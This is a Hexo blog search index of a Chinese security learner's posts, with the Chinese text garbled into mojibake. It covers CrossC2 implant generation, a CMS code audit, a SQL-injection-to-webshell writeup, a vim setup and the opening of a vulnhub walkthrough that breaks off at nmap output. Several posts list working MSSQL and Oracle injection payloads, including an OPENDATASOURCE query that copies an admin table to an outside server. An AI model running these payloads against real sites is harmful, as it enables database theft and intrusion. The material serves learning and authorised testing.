<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Mark_OnceBuild_CrossC2Object</title>
      <link href="/2020/07/10/Mark-OnceBuild-CrossC2Object/"/>
      <url>/2020/07/10/Mark-OnceBuild-CrossC2Object/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-å‰è¨€">0x00 å‰è¨€</h1><p>åœ¨å…¬å¸é¡¹ç›®ä¸Šï¼Œå¸®å®¢æˆ·æµ‹è¯•å†…ç½‘å®‰å…¨ï¼Œæœ‰ä¸€ä¸ªlinuxç³»ç»Ÿï¼Œç„¶åcsç”Ÿæˆä¸äº†LinuxğŸï¼Œäºæ˜¯æˆ‘å°±æ‰¾åˆ°äº†CrossC2æ’ä»¶ï¼Œä½†æ˜¯å‘¢ï¼ŒCrossC2æœ‰ä¸€äº›æœ‰ç‚¹é—®é¢˜ï¼Œè¿™é‡Œè®°ä¸€æ¬¡ä½¿ç”¨CrossC2çš„<strong>è¸©å‘è®°</strong></p><a id="more"></a><h1 id="0x01-CrossC2-ä»‹ç»">0x01 CrossC2 ä»‹ç»</h1><p>CrossC2 æ˜¯ä¸€æ¬¾ï¼Œå¯ä»¥ç”Ÿæˆ Linux / MacOS çš„ğŸï¼Œè›®å¼ºçš„</p><h1 id="0x02-CrossC2-ä½¿ç”¨">0x02 CrossC2 ä½¿ç”¨</h1><p>ä»Githubä¸Šé¢git clone ä¸‹æ¥æœ‰ä¸‰ä¸ªæ–‡ä»¶ï¼ŒLinuxåç¼€æ˜¯ç”ŸæˆLinuxğŸ åˆ™ MacOSå°±æ˜¯è‹¹æœç³»ç»Ÿçš„ğŸ</p><p><img src="1.png" alt="1"></p><p>CrossC2.cna æ˜¯Cobalt Strike çš„æ’ä»¶ã€‚æœ€ä¸»è¦è¦æ”¹åŠ¨çš„åœ°æ–¹æ˜¯ 77è¡Œã€‚ä¹‹ååœ¨CSä¸ŠåŠ ä¸Šæ’ä»¶å°±èƒ½çœ‹åˆ°äº†ã€‚</p><p>æˆ‘æ˜¯ä¸æ¨èä»æ’ä»¶é‡Œç”Ÿæˆæ‹‰ï¼Œé‚£æ ·ç”Ÿæˆçš„ä¸æ˜¯å¾ˆæœ‰æ•ˆæœã€‚</p><p><img src="2.png" alt="2"></p><p>å¤§éƒ¨åˆ†æˆ‘éƒ½æ˜¯ç›´æ¥ä½¿ç”¨ä¸»ç¨‹åºç”ŸæˆğŸã€‚CrossC2éƒ½ä¼šç»™ä½ é»˜è®¤å‚æ•°ï¼Œç¬¬ä¸€ä¸ªé»˜è®¤çš„å°±å·²ç»å¾ˆå¸¸ç”¨äº†</p><p><img src="3-1594619515456.png" alt="3"></p><p><strong>æ³¨æ„:è¿™é‡Œæ˜¯è¦æ”¾è¿› cs ç›®å½•ä¸‹çš„ï¼Œä¸ºäº†æ–¹ä¾¿æˆªå›¾å°±ç§»å‡ºæ¥äº†</strong></p><p><strong>æ³¨æ„:è¿™é‡Œæ˜¯è¦æ”¾è¿› cs ç›®å½•ä¸‹çš„ï¼Œä¸ºäº†æ–¹ä¾¿æˆªå›¾å°±ç§»å‡ºæ¥äº†</strong></p><p><strong>æ³¨æ„:è¿™é‡Œæ˜¯è¦æ”¾è¿› cs ç›®å½•ä¸‹çš„ï¼Œä¸ºäº†æ–¹ä¾¿æˆªå›¾å°±ç§»å‡ºæ¥äº†</strong></p><p><strong>é‡è¦çš„äº‹æƒ…è¯´ä¸‰é</strong></p><h1 id="0x03-CrossC2çš„å‘">0x03 CrossC2çš„å‘</h1><p><img src="4.png" alt="4"></p><p><img src="5.png" alt="5"></p><p>å¼€å¯csï¼Œç›‘å¬httpsï¼Œå‘å°±åœ¨è¿™é‡Œ</p><p>CrossC2 èµ°çš„å¿…é¡»æ˜¯https æ‰èƒ½å›æ˜¾</p><p><img src="6.png" alt="6"></p><p><img src="7.png" alt="7"></p>]]></content>
      
      
      
        <tags>
            
            <tag> note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iseacmsä»£ç å®¡è®¡å…¥é—¨çº§</title>
      <link href="/2020/05/14/iseacms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E7%BA%A7/"/>
      <url>/2020/05/14/iseacms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E7%BA%A7/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-iseacms-ç†Šæµ·CMS-ä»‹ç»ğŸ…°ï¸">0x01 iseacms ç†Šæµ·CMS ä»‹ç»ğŸ…°ï¸</h1><p>ç†Šæµ·CMSæ˜¯ç”±ç†Šæµ·å¼€å‘çš„ä¸€æ¬¾å¯å¹¿æ³›åº”ç”¨äºä¸ªäººåšå®¢ï¼Œä¸ªäººç½‘ç«™ï¼Œä¼ä¸šç½‘ç«™çš„ä¸€å¥—ç½‘ç«™ç»¼åˆç®¡ç†ç³»ç»Ÿã€‚</p><p>ç®€çš„æ¥è¯´ï¼Œå°±éå¸¸åˆé€‚åˆšåˆšå…¥é—¨çš„ ä»£ç å®¡è®¡æ¡ˆä¾‹ï¼ˆç®€å•åˆ°ä¼šçœ‹ä¸€ç‚¹ç‚¹phpä»£ç çš„äººéƒ½ä¼šçš„å®¡è®¡ï¼‰ï¼Œä»Šå¤©æ¥å¤ç›˜ä¸€ä¸‹</p><a id="more"></a><p><img src="1.jpg" alt="1"></p><p>ï¼ˆå…¶å®å·²ç»å¤ç›˜è¿‡äº†ï¼Œåªæ˜¯å†å¤ç›˜ä¸€éæ¥å……å®blogï¼Œå˜»å˜»ğŸ˜„ï¼‰</p><h1 id="0x02-å®æˆ˜">0x02 å®æˆ˜</h1><p>éœ€è¦ç”¨åˆ° seayæºä»£ç å®¡è®¡ç³»ç»Ÿ</p><p><img src="2.jpg" alt="2"></p><p>ä¸ªäººå–œæ¬¢ç›´æ¥ä¸Š è‡ªåŠ¨å®¡è®¡æ‰€ä»¥ï¼Œèµ°ä¸€æ³¢</p><p><img src="3.jpg" alt="3"></p><p>seayè‡ªåŠ¨å®¡è®¡å‡ºæ¥çš„ï¼Œä¸€èˆ¬ä¸ä¸€å®š100%å­˜åœ¨æ¼æ´ï¼Œå®ƒåŸç†æ˜¯æ­£åˆ™å»åŒ¹é…é‚£äº›å‡½æ•°ï¼Œæ¯”å¦‚ eval() å¯èƒ½å°± ä¼šå†™ä¸Šå…³äºeval() å‡½æ•°çš„æ­£åˆ™åŒ¹é…ã€‚å˜›ã€‚ä¸è¿‡æ¯”èµ·æ‰‹åŠ¨æ…¢æ…¢çš„çœ‹ï¼Œèƒ½çœå»å¾ˆå¤šéº»çƒ¦ã€‚æœ‰èƒ½åŠ›çš„ä¹Ÿå¯ä»¥å…ˆ<strong>ä»£ç é€šè¯»</strong> å†è‡ªåŠ¨åŒ–å®¡è®¡ï¼Œæ¯ä¸ªäººæ–¹æ³•ä¸ä¸€ï¼Œæˆ‘å°± ç”¨æˆ‘çš„æ–¹æ³•ã€‚</p><p><img src="4.jpg" alt="4"></p><p>ç‚¹è¿‡å»çœ‹åˆ°ï¼Œå¸¦æœ‰æ­£åˆ™åŒ¹é…å’Œè½¬ä¹‰çš„å‡½æ•°ã€‚</p><p>æ­£åˆ™åŒ¹é…**\W** å†™æ­»äº†ã€‚</p><p><img src="5.jpg" alt="5"></p><p>æ¥ç€å¾€ä¸Šçœ‹</p><p>/seacmseditor/php/controller.phpï¼š11è¡Œ</p><p><img src="6.jpg" alt="6"></p><p>è¿™ä¸‰ä¸ªå­˜åœ¨æ¼æ´ä¸”èƒ½åˆ©ç”¨ã€‚</p><p>éœ€è¦GETä¼ å‚ action, <strong>switch å¤šé€‰å‡½æ•°.</strong></p><p>å…ˆç¬¬ä¸€ä¸ªuploadfile ä¸Šä¼ æ‰“å¼€æŠ“åŒ…ä¸Šä¼ è¯•ä¸€ä¸‹ã€‚</p><p><img src="7.jpg" alt="7"></p><p>unicode è§£ç çœ‹ä¸€ä¸‹\u672a\u77e5\u9519\u8bef =&gt; æœªçŸ¥é”™è¯¯ ğŸ™…</p><p>å®Œç¾ï¼ŒæœªçŸ¥é”™è¯¯</p><p>ä¸‹ä¸€ä¸ªï¼ŒSQLæ³¨å…¥</p><h1 id="0x03-å¤šå¤„SQLæ³¨å…¥">0x03 å¤šå¤„SQLæ³¨å…¥</h1><p>/files/content.phpï¼š19è¡Œ</p><p><img src="8.jpg" alt="8"></p><p>åŠ äº† è½¬ä¹‰å‡½æ•°</p><p>å¯ä»¥ä½¿ç”¨ å®½å­—èŠ‚æ³¨å…¥(æœ‰æ¡ä»¶)</p><p>æŠ¥é”™æ³¨å…¥</p><p>è¿™é‡Œå°±ä½¿ç”¨ æŠ¥é”™æ³¨å…¥ æŠŠ</p><p><img src="9.jpg" alt="9"></p><p>å®½å­—èŠ‚æ³¨å…¥éœ€è¦ GBKç¼–ç </p><p><img src="10.jpg" alt="10"></p><p>ç™½ç›’å®¡è®¡ æºä»£ç  é‡Œæ˜æ˜¾æ²¡æœ‰å•ç‹¬è®¾ç½® ç¼–ç æ‰€ä»¥æ˜¯ä¸è¡Œçš„ã€‚</p><p><img src="11.jpg" alt="11"></p><p>æˆåŠŸæŠ¥å‡ºæ•°æ®åº“</p><p>åŒæ ·å­˜åœ¨SQLæ³¨å…¥çš„æ–‡ä»¶:</p><p>/files/software.php</p><p>/admin/files/reply.php</p><p>/admin/files/newlink.php</p>]]></content>
      
      
      
        <tags>
            
            <tag> code </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mark-once-WebShell_01</title>
      <link href="/2020/04/10/takeshell-01/"/>
      <url>/2020/04/10/takeshell-01/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-èµ·å› ğŸ´">0x01 èµ·å› ğŸ´</h1><p>åœ¨åšSRCæ´»åŠ¨çš„æ—¶å€™ã€‚æ‰«æåˆ°ä¸€ä¸ª ç½‘ç«™æºç å¤‡ä»½çš„ç½‘ç«™ï¼Œäºæ˜¯å°±æ‰“ç®—è¿›ä¸€æ­¥æ¸—é€ã€‚çœ‹çœ‹èƒ½ä¸èƒ½æ‹¿SHELL</p><a id="more"></a><h1 id="0x02-ç½‘ç«™SQLæ³¨å…¥">0x02 ç½‘ç«™SQLæ³¨å…¥</h1><p>ä»£ç å®¡è®¡åŠŸåº•ä¸å¤ªç†Ÿï¼Œå°±ç®€å•åˆ†æäº†ä¸€ä¸‹æ–‡ä»¶å†…å®¹ã€‚</p><p>çŸ¥é“äº†åå°ç®¡ç†æ˜¯/**system/ä¸‹ã€‚ç„¶åå°±å»ç½‘ç«™çœ‹çœ‹èƒ½ä¸èƒ½å‘ç°å…¶ä»–çš„æ¼æ´</p><p><img src="image1.jpeg" alt="image1"></p><p>å…ˆèµ°ä¸ªæµç¨‹ä¿¡æ¯æ”¶é›†ä¸‹ã€‚</p><p><img src="E:%5CWeb%5CphpStudy16%5Cblog%5Cblg%5Csource_posts%5Ctakeshell-01%5Cimage3.jpeg" alt="image3"><img src="image2-1586436949788.jpeg" alt="image2"></p><p>æƒŠäº†ã€‚Iis8.5 æƒ¹ä¸èµ·æƒ¹ä¸èµ·ã€‚</p><p>åœ¨ä¸€ä¸ªåœ°æ–¹æ‰¾åˆ°äº†ä¸€ä¸ªSQLæ³¨å…¥</p><p><img src="image4.jpeg" alt="image4"></p><p><img src="image5.jpeg" alt="image5"></p><p>å¾—åŠ²ğŸ”¥</p><p><img src="image6.jpeg" alt="image6"></p><p>å‘ç°sqlmapè·‘ä¸å‡º å¯†ç â”äºæ˜¯ æˆ‘ä¸Šæ‰‹å·¥äº†</p><p><img src="image7.jpeg" alt="image7"></p><p>ğŸ–¤å¾—å˜ã€‚ã€‚ç›´æ¥æ‰”è¿›SOMD5é‡Œè§£å¯†ã€‚</p><p>ç™»å½•åå°çœ‹çœ‹</p><p><img src="image8.jpeg" alt="image8"></p><p><img src="image9.jpeg" alt="image9"></p><p>ã€‚ã€‚ã€‚</p><p>ã€‚ã€‚ã€‚</p><p>ã€‚ã€‚ã€‚</p><p>æ‰¾äº†ä¸€äº›ã€‚èƒ½ä¸Šä¼ çš„åœ°æ–¹ï¼Œä½†æ˜¯éƒ½å¤±è´¥äº†ã€‚ç»éªŒä¸è¶³ä¸å¤ªä¼šã€‚ğŸ˜©</p><p>æ­£æ€è€ƒå’‹åŠçš„æ—¶å€™ã€‚çªç„¶çµå…‰ä¸€é—ªğŸŒ,å’±ä»¬ä¸æ˜¯è¿˜æœ‰SQLæ³¨å…¥å˜›ã€‚è¿˜æ˜¯MSSQLçš„æ•°æ®åº“</p><p>ç›´æ¥ä¸ŠOS-SHELL</p><h1 id="0x03-WEBSHELL-ğŸŒ„">0x03 WEBSHELL ğŸŒ„</h1><p><img src="image10.jpeg" alt="image10"></p><p>æƒé™æœ‰ç‚¹ä½å—·ã€‚ğŸ‰‘</p><p>ä¸Šä¼ ä¸€å¥è¯aspxå°é©¬</p><p><img src="image11.jpeg" alt="image11"></p><p><img src="image12.jpeg" alt="image12"></p><p><img src="image13.jpeg" alt="image13"></p><p>ç™¾åº¦äº‘çš„ä¸»æœºï¼Œæƒ¹ä¸èµ·</p><p>ã€‚ã€‚</p><p>ã€‚ã€‚</p><p>ã€‚ã€‚</p><p>åˆ°è¿™é‡Œæˆ‘ä¹Ÿå°±ä¸ç»§ç»­æ·±ç©¶äº†ã€‚è¯¥åˆ æœ¨é©¬çš„éƒ½åˆ äº†</p><p>æœ¬äººèœé¸Ÿç»éªŒä¸è¶³ã€‚ææƒé‚£äº›ã€‚240ä¸ªè¡¥ä¸ï¼Œæä¸ä¸Šã€‚ä¹Ÿæ²¡pythonç¯å¢ƒï¼Œ</p>]]></content>
      
      
      
        <tags>
            
            <tag> Getshell_Note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MSSQL_Blind_Injection</title>
      <link href="/2020/02/24/MSSQL%E7%9B%B2%E6%B3%A8/"/>
      <url>/2020/02/24/MSSQL%E7%9B%B2%E6%B3%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-å‰è¨€">0x00 å‰è¨€</h1><p>ä¸è¦é—®æˆ‘ä¸ºä»€ä¹ˆä¸é…å›¾ã€‚å› ä¸ºè¿™ä¸ªhexoè€æ˜¯æ¸²æŸ“å¤±è´¥ã€‚æçš„æˆ‘ç›´æ¥è£‚å¼€äº†ã€‚</p><p><img src="ADF1B901FABD5EA3559C8BE8518DBF08.jpg" alt></p><a id="more"></a><h1 id="0x01-MSSQLç›²æ³¨-å‰æœŸçŸ¥è¯†">0x01 MSSQLç›²æ³¨_å‰æœŸçŸ¥è¯†</h1><p>äº†è§£å‰ã€‚å…ˆæœ‰ä¸¤ä¸ªå‡½æ•°è¦å…ˆäº†è§£ä¸€ä¸‹count(),object_id()<br>1.union all select count(*) from dbo.sysobjects</p><pre><code class="language-msssql">union all select count(*) from dbo.sysobjectscountæŒ‡æ˜¯æŸ¥è¯¢è¡¨çš„æ‰€æœ‰è®°å½•æ•°ï¼Œä¹Ÿå°±æ˜¯æ— éœ€å»order byæŸ¥è¯¢å­—æ®µæ•°ã€‚å°±èƒ½è¾¾æˆå›æ˜¾(åªé™äºç›²æ³¨8?)=========================================?id=1 union all select null,db_name(),null //æŸ¥è¯¢å½“å‰åº“å ?id=1 union all select dbid,name,null from master.dbo.sysdatabases //æŸ¥è¯¢å½“å‰æ‰€æœ‰åº“ dbid æ˜¯æŒ‡æ•°æ®åº“çš„id, master.dbo.sysdatabases åˆ™æ˜¯æ¥æŸ¥è¯¢åº“========================================== object_id()ç®€å•çš„ä¸€å¥è¯æ€»ç»“å°±æ˜¯ å…å»äº† æŸ¥è¯¢id unino all select null,name,null from dbo.syscolumns where id=object_id('dbo.admin') //è¦æ³¨æ„è¿™é‡Œè¦åŠ å•å¼•å·æ‹¬èµ·æ¥</code></pre><h1 id="0x02-MSSQLç›²æ³¨">0x02 MSSQLç›²æ³¨</h1><pre><code class="language-mssql">#æŸ¥è¯¢åº“åé•¿åº¦?id=1 and (select count(*)from master.dbo.databases where dbid=1 and len(name)=4)=1====================================================#æŸ¥è¯¢åº“å?id=1 and (select count(*) from master.dbo.databases where dbid=1 and ascii(substring(name,1,1))=100)=1===================================================#æŸ¥è¯¢è¡¨å?id=1 and (select count(*) from dbo.sysobjects where name in(select top 1 name from dbo.sysobjects where xtype='U')and ascii(substring(name,1,1))=100)=1?id=1 and (select count(*) from dbo.sysobjects where name in(select top 1 name from dbo.sysobjects where xtype='U' and name not in('zkaq'))and ascii(substring(name,1,1))=100)=1tips: (top 1) æ˜¯æŒ‡æŸ¥è¯¢æœ€å¤§å€¼çš„é‚£ä¸€ä¸ª==================================================#æŸ¥è¯¢å­—æ®µå(å‡è®¾å·²çŒœå‡ºè¡¨å(zkaq666))?id=1 and (select count(*)from dbo.sysobjects where name in(select top 1 name from dbo.sysobjects where id=object_id('dbo.zkaq666'))and ascii(substring(name,1,1))=100)=1====================================================#æŸ¥è¯¢å­—æ®µå†…å®¹(å‡è®¾å·²çŒœå‡ºå­—æ®µå(username))?id=1 and (select count(*) from dbo.zkaq666 where username in(select top 1 username from dbo.zkaq666)and ascii(substring(username,1,1))=100)=1</code></pre><h1 id="0x03-æ€»ç»“">0x03 æ€»ç»“</h1><p><strong>å¾ˆä»–å¦ˆç®€å•ã€‚çœ‹ä¸æ‡‚çš„è‡ªå·±å»è¯•ä¸€è¯•ï¼</strong></p><hr><p><strong>å‚è€ƒè¿æ¥link:<br><a href="https://blog.csdn.net/v_gbird/article/details/93981684" target="_blank" rel="noopener">https://blog.csdn.net/v_gbird/article/details/93981684</a><br><a href="https://blog.csdn.net/kuxing100/article/details/9670533" target="_blank" rel="noopener">https://blog.csdn.net/kuxing100/article/details/9670533</a></strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> Note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Oracle Injection</title>
      <link href="/2020/02/20/Oracle%E6%B3%A8%E5%85%A5/"/>
      <url>/2020/02/20/Oracle%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-æ˜¾é”™æ³¨å…¥ğŸ”¥">0x01 æ˜¾é”™æ³¨å…¥ğŸ”¥</h1><a id="more"></a><p>æ‰€ç”¨åˆ°çš„è¯­å¥</p><ul><li>and <a href="http://1=ctxsys.drithsx.sn" target="_blank" rel="noopener">1=ctxsys.drithsx.sn</a>(1,(payload))</li><li>table_name&lt;&gt;â€˜ADMINâ€™    //&lt;&gt;æ„æ€æ˜¯ ä¸ç­‰äºã€‚ä¹Ÿå°±æ˜¯æ’é™¤</li></ul><p>and <a href="http://1=ctxsys.drithsx.sn" target="_blank" rel="noopener">1=ctxsys.drithsx.sn</a>(1,(select table_name from user_tables from rownum=1))</p><ul><li>â«rownumæŒ‡ï¼Œé™åˆ¶è¾“å‡ºåªè¾“å‡ºä¸€ä¸ªã€‚æŸ¥è¯¢è¡¨</li></ul><p><img src="5.jpg" alt="5"></p><p>and <a href="http://1=ctxsys.drithsx.sn" target="_blank" rel="noopener">1=ctxsys.drithsx.sn</a>(1,(select column_name from user_tab_columns where table_name=â€˜ADMINâ€™ and rownum=1))</p><p><img src="8.jpg" alt="8"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MSSQL Injection</title>
      <link href="/2020/02/20/MSSQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2020/02/20/MSSQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-æ˜¾é”™æ³¨å…¥ğŸ”¥">0x01 æ˜¾é”™æ³¨å…¥ğŸ”¥</h1><a id="more"></a><p>union all select db_name()  //æŸ¥è¯¢å½“å‰åº“å<br>union all select null,name,null from master.dbo.sysdatabases//æŸ¥è¯¢æ•°æ®åº“<br>union all select null,null,null from dbo.sysobjects //æŸ¥è¯¢è¡¨<br>union all select null,null,null from dbo.syscolumns//æŸ¥è¯¢å­—æ®µ</p><hr><p><strong>æŸ¥è¯¢æ•°æ®åº“</strong>ğŸ’»</p><p>?id=1 union all select null,name,null from master.dbo.stsdatabases</p><p><img src="12312321321.jpg" alt="12312321321"></p><p><strong>æŸ¥è¯¢è¡¨å</strong>ğŸ“‘</p><p>?id=1 union all select id,name,null from dbo.sysobjects where xtype=â€˜Uâ€™</p><ul><li>â«id å’Œ name æ˜¯ç³»ç»Ÿè‡ªå¸¦çš„å­—æ®µåã€‚æŸ¥è¯¢å®Œéœ€è¦è®°ä½ï¼Œä½ è¦æŸ¥è¯¢çš„è¡¨IDã€‚xtype='Uâ€™æ˜¯æŒ‡ç”¨æˆ·åˆ›å»ºçš„è¡¨</li></ul><p><img src="2.jpg" alt="1"></p><p><strong>æŸ¥è¯¢å­—æ®µå</strong></p><p>?id=1 union all select null,name,null from dbo.syscolumns where id=xxxxxx</p><ul><li><p>â« nullæ˜¯æŒ‡3ä¸ªå­—æ®µã€‚mssqlé‡Œçš„å­—ç¬¦ä¸²ç±»å‹ç®¡ç†ä¸¥æ ¼ï¼Œæœ‰å¯èƒ½ä¸€ä¸ªæ˜¯intç±»å‹ã€‚æˆ–è€…strç±»å‹ç­‰ã€‚</p><p><img src="3.jpg" alt="2"></p></li></ul><p><strong>æŸ¥è¯¢å­—æ®µå†…å®¹</strong></p><p>?id=1 union all select null,password,null from admin</p><p><img src="4.jpg" alt="3"></p><h1 id="0x02-MSSQL-åå¼¹æ³¨å…¥ğŸˆ">0x02 MSSQL åå¼¹æ³¨å…¥ğŸˆ</h1><ul><li><strong>å‰è¨€</strong>:</li></ul><p>è¿™ä¸ªæ˜¯ä¸€ä¸ªæ¯”è¾ƒéªšçš„æ“ä½œã€‚é’ˆå¯¹æ— å›æ˜¾æ³¨å…¥ç‚¹çš„æ—¶å€™ã€‚</p><h2 id="0x02-1-åå¼¹æ³¨å…¥åŸç†">0x02.1 åå¼¹æ³¨å…¥åŸç†</h2><ul><li>â˜‚ï¸MSSQLæ³¨å°„æ”»å‡»æ˜¯æœ€ä¸ºå¤æ‚çš„æ•°æ®åº“æ”»å‡»æŠ€æœ¯ï¼Œç”±äºè¯¥æ•°æ®åº“åŠŸèƒ½ååˆ†å¼ºå¤§ï¼Œå­˜å‚¨è¿‡ç¨‹ä»¥åŠå‡½æ•°è¯­å¥ååˆ†ä¸°å¯Œï¼Œè¿™äº›çµæ´»çš„è¯­å¥é€ å°±äº†æ–°é¢–çš„æ”»å‡»æ€è·¯ï¼Œè€Œåå¼¹æ³¨å…¥æŠ€æœ¯éœ€è¦ä¾é opendatasourceå‡½æ•°æ”¯æŒ</li><li></li></ul><h2 id="0x02-2-åå¼¹æ³¨å…¥æ¡ä»¶">0x02.2 åå¼¹æ³¨å…¥æ¡ä»¶</h2><ul><li>ğŸŒéœ€è¦ä¸€å°å¤–ç½‘ä¸»æœºï¼Œå­—æ®µè¦ç›¸åŒ</li></ul><h3 id="å¤ç°">å¤ç°</h3><ul><li>PayloadğŸ”«</li></ul><p>insert into opendatasource(â€˜sqloledbâ€™,â€˜server=IP,1433;uid=USERNAME;pwd=PASSWORD;database=DATABASEâ€™).DATABASE.dbo.TABLES select *from admin</p><ul><li>å¥å­ç†è§£</li></ul><p>opendatasource(â€˜sqloledbâ€™,â€˜server=IP,1433;uid=USERNAME;pwd=PASSWORD;database=DATABASEâ€™).DATABASE.dbo.TABLES select *from admin</p><ul><li>å»ºç«‹tempè¡¨4ä¸ªå­—æ®µ</li></ul><p>create table temp(a varchar(255), b varchar(255),c varchar(255),d varchar(255))</p><ul><li>æ’å…¥è¯­å¥åæŸ¥è¯¢</li></ul><p><img src="6.jpg" alt="6"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vim-vundle install and configuration</title>
      <link href="/2019/12/15/vim-vundle%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE/"/>
      <url>/2019/12/15/vim-vundle%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-å‰è¨€">0x00 å‰è¨€</h1><p>æƒ³åœ¨pycharmä½¿ç”¨ pwntools ä½†æ˜¯ pwntoolsä¸æ”¯æŒwindowsã€‚åªèƒ½è·‘åˆ°Linuxæï¼Œä½†æ˜¯Vimæ²¡æœ‰è¡¥å…¨äºæ˜¯æ‰“ç®—è£…ä¸ª è¡¥å…¨æ’ä»¶ã€‚é¡ºä¾¿å†™ä¸ªç¬”è®°</p><a id="more"></a><p><strong>ç¯å¢ƒï¼šKali</strong></p><h1 id="0x01-Vundleæ’ä»¶ç®¡ç†å®‰è£…">0x01 Vundleæ’ä»¶ç®¡ç†å®‰è£…</h1><p>æˆ‘ç”¨çš„æ˜¯kaliå’Œæ™®é€šå®‰è£…æœ‰äº›ä¸åŒã€‚</p><p>ç¬¬ä¸€æ­¥ gitï¼š</p><pre><code class="language-bash">git clone https://github.com/VundleVim/Vundle.vim.git ~/.vim/bundle/Vundle.vim</code></pre><p>åœ¨ ç”¨æˆ· ä¸‹<strong>å»ºç«‹.vimrcæ–‡ä»¶</strong> ä¾‹å­ï¼š</p><p>user:/user/.vimrc</p><p>root:/root/.vimrc</p><p>å†™ä¸Šä»¥ä¸‹çš„å¥å­</p><pre><code class="language-bash">set nocompatible              &quot; be iMproved, requiredfiletype off                  &quot; required&quot; set the runtime path to include Vundle and initializeset rtp+=~/.vim/bundle/Vundle.vimcall vundle#begin()Plugin 'VundleVim/Vundle.vim'Plugin 'tpope/vim-fugitive'Plugin 'L9'call vundle#end()            &quot; requiredfiletype plugin indent on    &quot; required</code></pre><p>æ‰“å¼€VIM ç›´æ¥æ‰“å¼€ä¸ç”¨é…åˆå…¶ä»–æ–‡ä»¶ä»€ä¹ˆçš„ã€‚</p><p>è¾“å…¥ :PluginInstallã€‚å®‰è£…å®Œåæ›´æ–°ä¸€ä¸‹ :PluginUpdate</p><p>ç­‰æ˜¾ç¤ºDoneï¼çš„å­—çš„æ—¶å€™å°±ä»£è¡¨çš„ å®‰è£…/æ›´æ–° æˆåŠŸ</p><pre><code class="language-shell">call vundle#begin()'''#æ’ä»¶åç§°ä½ç½®call vundle#end()</code></pre><p>å¦‚æœæˆ‘è¿™é‡Œä¸è¯¦ç»†ï¼Œå¯ä»¥å»githubçœ‹åŸç‰ˆçš„æ¡£æ¡ˆ</p><p>åœ°å€ï¼š<a href="https://github.com/VundleVim/" target="_blank" rel="noopener">https://github.com/VundleVim/</a></p><h1 id="0x02-vimå®‰è£…molokaié…è‰²æ–¹æ¡ˆ">0x02 vimå®‰è£…molokaié…è‰²æ–¹æ¡ˆ</h1><p>æˆ‘å®‰è£…å®Œæ’ä»¶åï¼Œå­—ä½“æ²¡äº†é¢œè‰²ã€‚æˆ‘ä¹Ÿæ²¡çœ‹å‡ºé—®é¢˜æ‰€åœ¨ã€‚å­—ä½“é¢œè‰²è„šæœ¬éƒ½æ²¡æœ‰åŠ è½½ã€‚æ‰€ä»¥æˆ‘æ‰“ç®—ç›´æ¥ä½¿ç”¨vimçš„æ’ä»¶ã€‚ä¸ä½¿ç”¨è‡ªå¸¦çš„é¢œè‰²è„šæœ¬</p><p>ç›´æ¥git ä¸‹æ¥</p><pre><code class="language-shell">git clone https://github.com/tomasr/molokai.git</code></pre><p>ç„¶å mv molokai/ /usr/share/(ä½ çš„vimç‰ˆæœ¬)/colors/ ä¸‹ã€‚</p><p>å¹¶åœ¨.vimrcæ–‡ä»¶ åé¢åŠ ä¸Š</p><pre><code class="language-shell">colorsheme molokailet g:molokai_original=1set t_Co=256set background=draksyntax onset nu!</code></pre><p>ä¿å­˜å¹¶é€€å‡ºã€‚è¿‡ä¼šå°±ä¼šç”Ÿæ•ˆäº†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub_sunrise</title>
      <link href="/2019/12/15/vulnhub%E9%9D%B6%E6%9C%BA-sunrise/"/>
      <url>/2019/12/15/vulnhub%E9%9D%B6%E6%9C%BA-sunrise/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-å‰è¨€">0x00 å‰è¨€</h1><p>å‰å‡ å¤©é€›äº†ä¸€ä¸‹vulnhub,çœ‹åˆ°æ¯”è¾ƒé€‚åˆæ–°æ‰‹çš„é¶æœºã€‚å°±ä¸‹è½½ä¸‹æ¥ç©ç©ã€‚</p><p>å¯æ²¡æƒ³åˆ°ä¸€ä¸ªå‘ï¼Œå‘äº†æˆ‘ä¸¤å¤©åŠï¼Œå…±ç”¨è®¡ä¸¤å¤©åŠã€‚</p><p>æœ‰å¥è¯æˆ‘æƒ³è®²ä¸€ä¸‹ **************************!!!</p><a id="more"></a><h1 id="0x01-Sunrise">0x01 Sunrise</h1><p>é¶æœºåœ°å€: <a href="https://download.vulnhub.com/sunset/sunrise.7z" target="_blank" rel="noopener">https://download.vulnhub.com/sunset/sunrise.7z</a></p><p>ä½œè€…: whitecr0wz</p><p>éš¾åº¦: Beginner(æ–°æ‰‹)</p><h3 id="0x01-1-ä¿¡æ¯æ”¶é›†">0x01.1 ä¿¡æ¯æ”¶é›†</h3><p>nmap -n -T4 172.16.123.109 -A</p><pre><code class="language-xml">Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-14 19:05 CSTStats: 0:00:00 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth ScanSYN Stealth Scan Timing: About 7.00% done; ETC: 19:05 